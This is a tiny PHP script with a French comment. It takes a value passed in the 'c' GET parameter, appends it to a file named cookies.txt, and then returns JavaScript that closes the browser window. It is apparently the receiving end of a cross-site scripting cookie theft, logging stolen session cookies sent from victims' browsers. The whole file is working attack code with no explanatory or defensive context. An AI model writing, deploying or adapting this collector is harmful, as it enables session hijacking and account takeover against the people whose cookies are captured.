<?php
$cookie = $_GET['c'];// on reconnaît c en variable GET

 $fp = fopen("cookies.txt","a"); 
 fputs($fp,$cookie . "\r\n"); 
 fclose($fp); 
 



?>

<script>
window.close();
</script>